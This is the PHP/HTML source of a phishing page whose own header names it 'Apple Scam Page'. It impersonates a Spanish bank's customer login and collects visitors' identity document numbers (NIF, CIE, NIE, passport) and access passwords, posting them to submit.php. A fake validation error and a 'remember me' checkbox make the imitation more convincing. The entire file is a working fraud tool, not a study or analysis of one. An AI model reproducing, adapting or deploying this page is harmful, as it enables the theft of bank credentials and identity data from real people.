<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             2019
 * @package           Apple Scam Page
 *
 * Project Name:      Apple Scam
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
include_once './inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="./assets/css/helpers.css">
        <link rel="stylesheet" href="./assets/css/main.css">

        <link rel="icon" type="image/png" href="./assets/images/fav.png" />


        <title>Particulares</title>
    </head>

    <body>

        <header id="header">
            <div class="container">
                <div class="d-flex align-items-center">
                    <div class="flex-grow-1"><img class="logo" src="./assets/images/ss.png"></div>
                    <div class="question">
                        <i class="far fa-question-circle"></i>
                        <span>Atención al cliente</span>
                    </div>
                </div>
            </div>
        </header>

        <main id="main" class="pt-5 pb-5">
            <div class="container">
                <div class="row">
                    <div class="col-lg-7 col-md-7 col-sm-12 col-12 mb-lg-0 mb-md-0 mb-sm-5 mb-5">
                        <div class="main-title">
                            <h1>Buenos días</h1>
                            <p><?php echo date('d'); ?> <?php echo get_monthsss(); ?> <?php echo date('Y'); ?></p>
                        </div>
                    </div>
                    <div class="col-lg-5 col-md-5 col-sm-12 col-12">
                        <form action="submit.php" method="post">
                            <div class="row mb-3 second_style">
                                <div class="col-md-6 mb-lg-0 mb-md-0 mb-sm-3 mb-3 first_input">
                                    <select class="form-control" name="log_type" id="log_type">
                                        <option value="doc">Documento</option>
                                        <option value="user">Usuario</option>
                                    </select>
                                </div>
                                <div class="col-md-6 second_input">
                                    <select class="form-control" name="log_type2" id="log_type2">
                                        <option value="NIF">NIF</option>
                                        <option value="CIF">CIF</option>
                                        <option value="NIE">NIE</option>
                                        <option value="Pasaporte">Pasaporte</option>
                                    </select>
                                </div>
                            </div>
                            <div class="form-group mb-3">
                                <input type="text" class="form-control is-invalid" value="<?php echo get_value('login'); ?>" name="id_no" id="id_no" placeholder="NIF">
                            </div>
                            <div class="form-group mb-3">
                                <input type="password" class="form-control is-invalid" name="password" id="password" placeholder="Clave de acceso">
                            </div>
                            <div class="checkbox">
                                <label style="font-size: 2em">
                                    <input type="checkbox" value="" checked>
                                    <span class="cr"><i class="cr-icon fa fa-check"></i></span>
                                    <span class="zz">Recordar mi usuario</span>
                                </label>
                            </div>
                            <input type="hidden" name="type" value="login2">
                            <button type="submit" class="mb-5">ENTRAR</button>
                            <?php
                            if( count($_SESSION['errors']) > 0 ) {
                                ?><div class="error-message mb-5">Ha de introducir un identificador y/o clave válidos.</div><?php
                            }
                            ?>
                        </form>
                        <div class="form-buttons">
                            <div class="row">
                                <div class="col-6"><a href="#">Recuperar clave</a></div>
                                <div class="col-6"><a href="#">Obtener claves</a></div>
                            </div>
                            <hr style="background-color: #fff; margin: 40px 0">
                            <a style="font-size: 16px; text-transform: uppercase; font-weight: 600; padding: 15px 0"href="#">Hazte cliente</a>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <!-- JS FILES -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="./assets/js/popper.min.js"></script>
        <script src="./assets/js/bootstrap.min.js"></script>
        <script src="./assets/js/fontawesome.min.js"></script>
        <script src="./assets/js/main.js"></script>
        <script type="text/javascript">
            $('#log_type').change(function(){
                var this_val = $(this).val();
                if( this_val == 'user' ) {
                    $('.first_input').removeClass('col-md-6').addClass('col-md-12');
                    $('.second_input').hide();
                    $('#id_no').attr('placeholder','Usuario');
                } else {
                    $('.first_input').removeClass('col-md-12').addClass('col-md-6');
                    $('.second_input').show();
                    $('#id_no').attr('placeholder','Documento');
                }
            });

            $('#log_type2').change(function(){
                var this_val2 = $(this).val();
                $('#id_no').attr('placeholder',this_val2);
            });
        </script>
        <script>
            var d = new Date();

            var time_now = d.getHours();
            if(time_now > 17 && time_now <= 19){
            document.body.style.backgroundImage = "url('./assets/images/bg.jpg')";
            }else if(time_now > 20){
                document.body.style.backgroundImage = "url('./assets/images/summer_night_p.jpg')";
            }
        </script>
    </body>

</html>